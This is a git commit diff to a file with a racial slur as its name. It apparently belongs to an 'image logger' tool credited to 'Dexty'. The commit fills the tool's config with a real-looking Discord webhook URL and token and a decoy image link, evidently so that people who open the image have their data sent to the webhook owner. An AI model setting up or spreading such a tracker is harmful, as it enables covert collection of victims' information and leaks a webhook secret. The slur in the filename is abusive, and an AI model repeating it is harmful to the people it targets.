80bc3d486500c009ffbdd3ee1ff4fa29f1241c90
Itslioz <68975041+Itslioz@users.noreply.github.com>
2025-04-02 12:07:57 +0300

    Update nigga.py

--- api/nigga.py
+++ api/nigga.py
@@ -12,8 +12,8 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1356702838717284529/iNzMP36fG0dYbI57ByNesArOM2-qaQHHicjbwVkIGlfksViE9MIkD8xiMAyG27fZZRvh",
+    "image": "https://ih1.redbubble.net/image.2399688383.9657/bg,f8f8f8-flat,750x,075,f-pad,750x1000,f8f8f8.u2.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
